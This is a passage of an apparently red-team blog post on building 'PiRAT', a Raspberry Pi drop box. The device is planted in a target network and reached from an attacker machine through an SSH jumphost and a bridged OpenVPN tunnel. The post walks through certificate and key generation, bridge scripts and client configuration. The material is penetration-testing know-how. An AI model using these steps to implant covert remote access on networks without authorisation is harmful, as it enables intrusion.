</span></span><span class="line"><span class="cl">Certificate is to be certified <span class="k">until</span> Nov  <span class="m">7</span> 02:58:57 <span class="m">2027</span> GMT <span class="o">(</span><span class="m">3650</span> days<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Write out database with <span class="m">1</span> new entries
</span></span><span class="line"><span class="cl">Data Base Updated
</span></span></code></pre></div></li>
<li>
<p>You can verify the newly generated <code>pirat-server.crt</code> with the openssl command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ openssl x509 -noout -text -in /home/pi/openvpn-ca/pki/issued/pirat-server.crt
</span></span></code></pre></div></li>
</ul>
<p><strong>Client Certificates</strong></p>
<p>Just like server certificates, clients can be authenticated using client-specific certificates. With this method, each client can be required to have a unique certificate. The certificate <code>Common Name (CN)</code> can be used to determine other parameters to be pushed on a given connection via client-connect scripts or the <code>clientconfig-dir</code> option.</p>
<ul>
<li>
<p>Generate the client certificate with the following <code>easy-rsa</code> command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="nv">pi</span><span class="err">@</span><span class="nv">raspberrypi</span><span class="err">:~/</span><span class="nv">openvpn-ca</span> <span class="err">$</span> <span class="nv">.</span><span class="err">/</span><span class="nv">easyrsa</span> <span class="nv">build-client-full</span> <span class="nv">client1</span>
</span></span><span class="line"><span class="cl"><span class="nv">NOTE</span><span class="err">:</span> <span class="nv">If</span> <span class="nv">you</span> <span class="nv">run</span> <span class="nv">.</span><span class="err">/</span><span class="nv">clean-all</span><span class="p">,</span> <span class="nv">I</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">doing</span> <span class="nv">a</span> <span class="nv">rm</span> <span class="nv">-rf</span> <span class="kc">on</span> <span class="err">/</span><span class="nv">usr</span><span class="err">/</span><span class="nv">share</span><span class="err">/</span><span class="nv">easy-rsa</span><span class="err">/</span><span class="nv">keys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">Note</span><span class="err">:</span> <span class="nv">using</span> <span class="nv">Easy-RSA</span> <span class="nv">configuration</span> <span class="nv">from</span><span class="err">:</span> <span class="nv">.</span><span class="err">/</span><span class="nv">vars</span>
</span></span><span class="line"><span class="cl"><span class="nv">Generating</span> <span class="nv">a</span> <span class="nv">2048</span> <span class="nv">bit</span> <span class="nv">RSA</span> <span class="nv">private</span> <span class="nv">key</span>
</span></span><span class="line"><span class="cl"><span class="nv">...................................</span><span class="err">+++</span>
</span></span><span class="line"><span class="cl"><span class="nv">writing</span> <span class="nv">new</span> <span class="nv">private</span> <span class="nv">key</span> <span class="nv">to</span> <span class="err">&#39;/</span><span class="nv">home</span><span class="err">/</span><span class="nv">pi</span><span class="err">/</span><span class="nv">openvpn-ca</span><span class="err">/</span><span class="nv">pki</span><span class="err">/</span><span class="nv">private</span><span class="err">/</span><span class="nv">client1.key.M3yJau82OR</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">Enter</span> <span class="nv">PEM</span> <span class="nv">pass</span> <span class="nv">phrase</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="nv">Verifying</span> <span class="nv">-</span> <span class="nv">Enter</span> <span class="nv">PEM</span> <span class="nv">pass</span> <span class="nv">phrase</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="nv">-----</span>
</span></span><span class="line"><span class="cl"><span class="nv">Using</span> <span class="nv">configuration</span> <span class="nv">from</span> <span class="nv">.</span><span class="err">/</span><span class="nv">openssl-easyrsa.cnf</span>
</span></span><span class="line"><span class="cl"><span class="nv">Enter</span> <span class="nv">pass</span> <span class="nv">phrase</span> <span class="nv">for</span> <span class="err">/</span><span class="nv">home</span><span class="err">/</span><span class="nv">pi</span><span class="err">/</span><span class="nv">openvpn-ca</span><span class="err">/</span><span class="nv">pki</span><span class="err">/</span><span class="nv">private</span><span class="err">/</span><span class="nv">ca.key</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="nv">Check</span> <span class="nv">that</span> <span class="nv">the</span> <span class="nv">request</span> <span class="nv">matches</span> <span class="nv">the</span> <span class="nv">signature</span>
</span></span><span class="line"><span class="cl"><span class="nv">Signature</span> <span class="nv">ok</span>
</span></span><span class="line"><span class="cl"><span class="nv">The</span> <span class="nv">Subject</span><span class="err">&#39;</span><span class="nv">s</span> <span class="nv">Distinguished</span> <span class="nv">Name</span> <span class="nv">is</span> <span class="nv">as</span> <span class="nv">follows</span>
</span></span><span class="line"><span class="cl"><span class="nv">commonName</span>            <span class="err">:</span><span class="nv">ASN.1</span> <span class="nv">12</span><span class="err">:&#39;</span><span class="nv">client1</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">Certificate</span> <span class="nv">is</span> <span class="nv">to</span> <span class="nv">be</span> <span class="nv">certified</span> <span class="nv">until</span> <span class="nv">Nov</span>  <span class="nv">7</span> <span class="nv">03</span><span class="err">:</span><span class="nv">16</span><span class="err">:</span><span class="nv">10</span> <span class="nv">2027</span> <span class="nf">GMT</span> <span class="p">(</span><span class="nv">3650</span> <span class="nv">days</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">Write</span> <span class="nv">out</span> <span class="nv">database</span> <span class="nv">with</span> <span class="nv">1</span> <span class="nv">new</span> <span class="nv">entries</span>
</span></span><span class="line"><span class="cl"><span class="nv">Data</span> <span class="nv">Base</span> <span class="nv">Updated</span>
</span></span></code></pre></div></li>
<li>
<p>You can verify the newly generated <code>client1.crt</code> with the openssl command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ openssl x509 -noout -text -in /home/pi/openvpn-ca/pki/issued/client1.crt
</span></span></code></pre></div></li>
<li>
<p>Create a new directory for the openvpn server config and adjust permissions</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:/ $ sudo mkdir /etc/openvpn/pirat <span class="o">&amp;&amp;</span> sudo chmod <span class="m">700</span> /etc/openvpn/pirat/
</span></span></code></pre></div></li>
<li>
<p>Copy over the CA certificate and the server certificate / private key pair to the new directory (<code>/etc/openvpn/pirat/</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:/ $ sudo cp ~/openvpn-ca/pki/ca.crt /etc/openvpn/pirat/pirat-ca.crt
</span></span><span class="line"><span class="cl">pi@raspberrypi:/ $ sudo cp ~/openvpn-ca/pki/issued/pirat-server.crt /etc/openvpn/pirat/server.crt
</span></span><span class="line"><span class="cl">pi@raspberrypi:/ $ sudo cp ~/openvpn-ca/pki/private/pirat-server.key /etc/openvpn/pirat/server.key
</span></span></code></pre></div></li>
</ul>
<p><strong>Adding Extra Security</strong> (optional)
This is optional because the vpn tunnel will be established over an already secure ssh tunnel. However, defence in depth is not a bad idea.</p>
<ul>
<li>
<p>Using Diffie-Hellman session keys.</p>
<p>In client/server mode, OpenVPN is configured using a Public Key Infrastructure (PKI), with X.509 certificates and private keys. It is also possible to use X.509 certificates and private keys to set up a point-to-point tunnel. The advantage of using X.509 certificates over pre-shared keys is that it offers Perfect Forward Secrecy (PFS). More information on this can be found <a href="https://en.wikipedia.org/wiki/Forward_secrecy"   target="_blank">
    here</a>.</p>
<p>On the server side, we also need to generate a Diffie-Hellman parameter file that is
required for vpn session keys. The session keys are ephemeral or temporary keys
and are generated when the connection between client and server is first set up.</p>
</li>
<li>
<p>Generate a Diffie-Hellman parameter file, execute the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ mkdir ~/openvpn-ca/pki/dh <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ~/openvpn-ca/pki/dh
</span></span><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca/pki/dh $ openssl dhparam -out dh2048.pem <span class="m">2048</span>
</span></span><span class="line"><span class="cl">Generating DH parameters, <span class="m">2048</span> bit long safe prime, generator <span class="m">2</span>
</span></span><span class="line"><span class="cl">This is going to take a long <span class="nb">time</span>
</span></span><span class="line"><span class="cl">...................................+++
</span></span></code></pre></div></li>
<li>
<p>Copy the Diffie-Hellman key to the <code>/etc/openvpn/pirat/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca/pki/dh $ sudo cp ~/openvpn-ca/pki/dh/dh2048.pem /etc/openvpn/pirat/
</span></span></code></pre></div></li>
<li>
<p>Using tls-auth keys.</p>
<p>In the client/server mode, OpenVPN will attempt to establish a TLS control channel for each client that tries to connect. Setting up a TLS control channel is resource consuming, which makes OpenVPN susceptible to denial-of-service attacks: an attacker could launch a multitude of misconfigured clients that all try to connect to the OpenVPN server. For each of these, the OpenVPN server would attempt to set up a TLS connection, which will effectively lead to a denial of service for well-configured clients. This is especially true when OpenVPN is running using proto udp (the recommended default). UDP traffic is connectionless, which means that for each new UDP packet that the server receives, it must verify if it is a valid OpenVPN packet.</p>
</li>
<li>
<p>Generate a tls-auth key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca/pki $ mkdir ~/openvpn-ca/pki/tls-auth <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ~/openvpn-ca/pki/tls-auth
</span></span><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca/pki/tls-auth $ openvpn --genkey --secret ta.key
</span></span><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca/pki/tls-auth $ sudo cp ~/openvpn-ca/pki/tls-auth/ta.key /etc/openvpn/pirat/
</span></span></code></pre></div><p>Just like the clientâ€™s private key file, the tls-auth key needs to be copied to each client using a secure channel, or it needs to be included in a secure client configuration package.</p>
</li>
<li>
<p>On the <strong>attacker</strong> machine we can <code>scp</code> the required openvpn client files as shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phish@attacker $ mkdir ~/Desktop/pirat_vpn <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ~/Desktop/pirat_vpn
</span></span><span class="line"><span class="cl">phish@attacker:~/Desktop/pirat_vpn $ scp pi-via-jumphost:/home/pi/openvpn-ca/pki/tls-auth/ta.key ~/Desktop/pirat_vpn/
</span></span><span class="line"><span class="cl">phish@attacker:~/Desktop/pirat_vpn $ scp pi-via-jumphost:/home/pi/openvpn-ca/pki/issued/client1.crt ~/Desktop/pirat_vpn/
</span></span><span class="line"><span class="cl">phish@attacker:~/Desktop/pirat_vpn $ scp pi-via-jumphost:/home/pi/openvpn-ca/pki/private/client1.key ~/Desktop/pirat_vpn/
</span></span><span class="line"><span class="cl">phish@attacker:~/Desktop/pirat_vpn $ scp pi-via-jumphost:/home/pi/openvpn-ca/pki/ca.crt ~/Desktop/pirat_vpn/
</span></span></code></pre></div></li>
</ul>
<div id="openvpn-server-config" class="anchor"></div>
<h4 class="relative group">OpenVPN Server Config 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#openvpn-server-config" aria-label="Anchor">#</a></span>        
    
</h4>
<ul>
<li>
<p>Create a script to bring up a bridged interface (<code>pirat-bridge-start.sh</code>):</p>
<p>The network bridge is used between the LAN adapter <code>eth0</code> and the
OpenVPN virtual tap adapter <code>tap0</code>. We need to create the tap adapter <code>tap0</code> using the system package <code>bridge-utils</code> before starting the OpenVPN server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">br</span><span class="o">=</span><span class="s2">&#34;br0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">tap</span><span class="o">=</span><span class="s2">&#34;tap0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">eth</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create the tap adapter</span>
</span></span><span class="line"><span class="cl">openvpn --mktun --dev <span class="nv">$tap</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create the bridge and add interfaces</span>
</span></span><span class="line"><span class="cl">brctl addbr <span class="nv">$br</span>
</span></span><span class="line"><span class="cl">brctl addif <span class="nv">$br</span> <span class="nv">$eth</span>
</span></span><span class="line"><span class="cl">brctl addif <span class="nv">$br</span> <span class="nv">$tap</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Configure the bridge</span>
</span></span><span class="line"><span class="cl">ifconfig <span class="nv">$tap</span> 0.0.0.0 promisc up
</span></span><span class="line"><span class="cl">ifconfig <span class="nv">$eth</span> 0.0.0.0 promisc up
</span></span><span class="line"><span class="cl">ifconfig <span class="nv">$br</span> 0.0.0.0 0.0.0.0 <span class="o">&amp;&amp;</span> dhclient
</span></span></code></pre></div></li>
<li>
<p>Make sure it is executable and execute the script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ chmod +x pirat-bridge-start.sh
</span></span><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo ./pirat-bridge-start.sh
</span></span></code></pre></div></li>
<li>
<p>Create the OpenVPN server configuration file (<code>pirat-server</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ touch pirat-server
</span></span><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo mv pirat-server /etc/openvpn/server/
</span></span></code></pre></div></li>
<li>
<p>Using an external DHCP server (this provides the vpn client with seamless integration within the target network)</p>
<p>Normally, OpenVPN assigns IP addresses to its clients using either the following command:</p>
<pre tabindex="0"><code>server 10.200.0.0 255.255.255.0
</code></pre><p>Or:</p>
<pre tabindex="0"><code>server-bridge 192.168.3.15 255.255.255.0 192.168.3.128 192.168.3.250
</code></pre><p>To use an external DHCP server, simply remove the specification of any IP address ranges after the <code>server-bridge</code> option.</p>
</li>
<li>
<p>The final <code>pirat-server</code> configuration file should look like something like this:</p>
<pre tabindex="0"><code>tls-server
proto tcp
port 1194
dev tap0
server-bridge
remote-cert-tls client
tls-auth /etc/openvpn/pirat/ta.key 0
dh /etc/openvpn/pirat/dh2048.pem
ca /etc/openvpn/pirat/pirat-ca.crt
cert /etc/openvpn/pirat/server.crt
key /etc/openvpn/pirat/server.key
persist-key
persist-tun
keepalive 10 60
user nobody
group nogroup
verb 3
daemon
log-append /var/log/openvpn.log
</code></pre><p>The line <code>dev tap0</code> in the  server config file is crucial for a bridged setup to work. We have created the tap adapter for the bridge prior to starting OpenVPN. In order to use this adapter, we must explicitly specify the name of the adapter. Otherwise, OpenVPN will create a new, non-bridged adapter at startup.</p>
</li>
<li>
<p>Start the openvpn server (you will be prompted for the <code>server private key pass phrase</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo systemctl start openvpn-server@pirat-server
</span></span><span class="line"><span class="cl">Enter Private Key Password: *********
</span></span></code></pre></div></li>
<li>
<p>Tear Down Script</p>
<p>When the OpenVPN server process is stopped, the network bridge is not automatically shut down as well. As the bridge was created before OpenVPN itself was started, the bridge persists until it is torn down manually. The following commands stop and remove the bridge created with the <code>pirat-start-bridge</code> script.</p>
</li>
<li>
<p>Create a new file called <code>pirat-bridge-stop.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ touch pirat-bridge-stop.sh
</span></span></code></pre></div><p>Paste the following into the shell script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>ifconfig br0 down
</span></span><span class="line"><span class="cl">brctl delif br0 eth0
</span></span><span class="line"><span class="cl">brctl delif br0 tap0
</span></span><span class="line"><span class="cl">brctl delbr br0
</span></span><span class="line"><span class="cl">openvpn --rmtun --dev tap0
</span></span></code></pre></div></li>
<li>
<p>Make the script executable:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ chmod +x pirat-bridge-stop.sh
</span></span></code></pre></div><p>The rpi (PiRAT) configuration is now complete.</p>
</li>
</ul>
<div id="jumphost-ec2-vps-config" class="anchor"></div>
<h3 class="relative group">Jumphost (EC2 VPS) Config 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#jumphost-ec2-vps-config" aria-label="Anchor">#</a></span>        
    
</h3>
<p>Spin up a new aws ec2 instance (or whatever hosting provider you use). Assign a keypair to the host in aws and download the private key (<code>.pem</code> format usually from aws).</p>
<ul>
<li>ssh into the jumphost.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phish@attacker $ ssh -i ~/.ssh/jumphost.pem -p <span class="m">22</span> ubuntu@54.66.199.59
</span></span></code></pre></div><ul>
<li>
<p>It is recommended to harden the ssh config of the jumphost (as it is publicly exposed on the internet) - disable password-based auth etc.. Apart from regular ssh hardening, ensure that fail2ban is setup / configured.</p>
</li>
<li>
<p>To allow the rpi (PiRAT) to connect to our jumphost, we need to copy over its ssh public key into the <code>authorized_keys</code> file on the jumphost. Use <code>ssh-copy</code> or <code>scp</code> to copy the public key of the rpi to the jumphost.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ubuntu@jumphost:~$ cat ~/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">ssh-ed25519 ..public-key-contents-here.. jumphost
</span></span><span class="line"><span class="cl">ssh-ed25519 ..public-key-contents-here.. pi@raspberrypi
</span></span></code></pre></div><div id="attacker-machine-config" class="anchor"></div>
<h3 class="relative group">Attacker Machine Config 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#attacker-machine-config" aria-label="Anchor">#</a></span>        
    
</h3>
<ul>
<li>
<p>Add an entry to <code>~/.ssh/config/</code> to connect to the rpi (PiRAT) via the jumphost.</p>
<pre tabindex="0"><code>Host pirat-via-jumphost
  User pi
  IdentityFile ~/.ssh/pi_rat/id_ed25519
  ProxyCommand ssh -i ~/.ssh/pi_rat/jumphost.pem -W localhost:2020 -p 443 ubuntu@jumphost
  LocalForward 1194 127.0.0.1:1194
</code></pre></li>
<li>
<p>Add a hosts entry for jumphost in the <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="mf">127.0.0.1</span>          <span class="nv">localhost</span>
</span></span><span class="line"><span class="cl"><span class="mf">255.255.255.255</span>    <span class="nv">broadcasthost</span>
</span></span><span class="line"><span class="cl"><span class="err">::</span><span class="nv">1</span>                <span class="nv">localhost</span>
</span></span><span class="line"><span class="cl"><span class="mf">13.210.113.204</span>     <span class="nv">jumphost</span>
</span></span></code></pre></div></li>
<li>
<p>Test that ssh works from your attacker machine to the rpi via jumphost.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phish@attacker:~ $ ssh pirat-via-jumphost
</span></span><span class="line"><span class="cl">Host key fingerprint is SHA256: ...
</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 2048<span class="o">]</span>----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>              ...<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>             <span class="o">=</span> o.<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>            o /.<span class="o">=</span><span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>         . . <span class="o">=</span> /%<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        S o . BE@<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>         .   *o*.<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>            o.<span class="o">=</span>..<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>           . . .o<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>            .o<span class="o">=</span>B*<span class="p">|</span>
</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</span></span><span class="line"><span class="cl">Host key fingerprint is SHA256: ...
</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 2048<span class="o">]</span>----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>               +o<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>                E<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>                .<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      o ..o    . <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       <span class="o">=</span>S. +o o  <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>    . o ..oooo . <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   o .++.+o+ .o  <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>    +..X+.Ooo*   <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="nv">oB</span><span class="o">==</span>+.<span class="o">==</span> .  <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pi@raspberrypi:~ $
</span></span></code></pre></div></li>
<li>
<p>OpenVPN Client Configuration File</p>
<p>This is the configuration file for used by the OpenVPN client.</p>
<pre tabindex="0"><code>proto tcp
port 1194
dev tap
client
remote localhost
nobind
remote-cert-tls server
tls-auth /Users/dunderhay/Desktop/pirat_vpn/ta.key 1
ca /Users/dunderhay/Desktop/pirat_vpn/ca.crt
cert /Users/dunderhay/Desktop/pirat_vpn/client1.crt
key /Users/dunderhay/Desktop/pirat_vpn/client1.key
</code></pre></li>
</ul>
<div id="operating-pirat" class="anchor"></div>
<h2 class="relative group">Operating PiRAT 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#operating-pirat" aria-label="Anchor">#</a></span>        
    
</h2>
<ul>
<li>
<p>Connect to PiRAT via the wifi management access point.</p>
<p>Once PiRAT has booted, you should see a new AP called <strong>PiRAT</strong> (unless you have changed the name during setup).</p>
<p>Connect to the AP with the wifi password you configured. Once connected to the device, SSH into PiRAT so you can manage it.</p>
<p>The <code>eth0</code> adapter should have received an IP address if a DHCP server is present and configured to hand out addresses.</p>
<p>Next we create the network bridge.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phish@attacker:~ $ ssh -i ~/.ssh/pi_rat/id_ed25519 -p <span class="m">2020</span> pi@172.16.66.1
</span></span></code></pre></div></li>
<li>
<p>Creating the network bridge</p>
<p>We simply need to run the <code>pirat-bridge-start.sh</code> bash script created early on PiRAT (server-side) to create the network bridge. This will create the following interfaces:</p>
<table>
<thead>
<tr>
<th>Interface</th>
<th>Name</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Ethernet Interface</td>
<td>eth0</td>
<td></td>
</tr>
<tr>
<td>Virtual Bridge Interface</td>
<td>br0</td>
<td></td>
</tr>
<tr>
<td>Virtual TAP Interface</td>
<td>tap0</td>
<td></td>
</tr>
</tbody>
</table>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo ./pirat-bridge-start.sh
</span></span></code></pre></div><p><a href="https://asciinema.org/a/svmsXpsuDfCvCECO6D1nj9zRd"   target="_blank">
    




  <figure>
    <img class="my-0 rounded-md" src="https://asciinema.org/a/svmsXpsuDfCvCECO6D1nj9zRd.png" alt="asciicast" />
    
  </figure>

</a></p>
</li>
<li>
<p>Establish SSH VPN tunnel connection with jumphost.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo systemctl start autossh-vpn-tunnel.service
</span></span></code></pre></div><p><a href="https://asciinema.org/a/f9tCiWqcosCFYzuHPLCZkMEoP"   target="_blank">
    




  <figure>
    <img class="my-0 rounded-md" src="https://asciinema.org/a/f9tCiWqcosCFYzuHPLCZkMEoP.png" alt="asciicast" />
    
  </figure>

</a></p>
</li>
<li>
<p>Start the OpenVPN server on PiRAT.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo systemctl start openvpn-server@pirat-server
</span></span></code></pre></div><p><a href="https://asciinema.org/a/aX69OJHupDnNQxCHYj73Y8qd1"   target="_blank">
    




  <figure>
    <img class="my-0 rounded-md" src="https://asciinema.org/a/aX69OJHupDnNQxCHYj73Y8qd1.png" alt="asciicast" />
    
  </figure>

</a></p>
</li>
<li>
<p>SSH to <strong>pirat-via-jumphost</strong>. This will forward the OpenVPN default port <code>1194</code> and make it available on the <strong>attackers</strong> machine on <code>localhost:1194</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phish@attacker:~ $ ssh pirat-via-jumphost
</span></span></code></pre></div><p><a href="https://asciinema.org/a/OZWBlWvqbNJIsaK3Fyia5Ch9l"   target="_blank">
    




  <figure>
    <img class="my-0 rounded-md" src="https://asciinema.org/a/OZWBlWvqbNJIsaK3Fyia5Ch9l.png" alt="asciicast" />
    
  </figure>

</a></p>
</li>
<li>
<p>Disconnect from the Management interface</p>
<p>Simply disconnect from the PiRAT AP.</p>
</li>
<li>
<p>Connect the OpenVPN client</p>
<p>On MacOS I use <a href="https://tunnelblick.net/downloads.html"   target="_blank">
    Tunnelblick</a>, which is a free open source OpenVPN client.</p>
<p>Import the OpenVPN client configuration file created earlier.</p>
</li>
<li>
<p>Removing the network bridge</p>
<p>If the bridge is no longer needed, it is best to remove the network bridge <code>br0</code> and the persistent <code>tap0</code> interfaces:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo ./pirat-bridge-stop.sh
</span></span></code></pre></div></li>
</ul>

        </div>
                
        

        
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://dunderhay.github.io/posts/physec/remotebox/&amp;title=PiRAT%20-%20Remote%20Drop%20Box"
      title="Share on LinkedIn"
      aria-label="Share on LinkedIn"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://twitter.com/intent/tweet/?url=https://dunderhay.github.io/posts/physec/remotebox/&amp;text=PiRAT%20-%20Remote%20Drop%20Box"
      title="Tweet on Twitter"
      aria-label="Tweet on Twitter"
      >
      

  <span class="relative block icon">
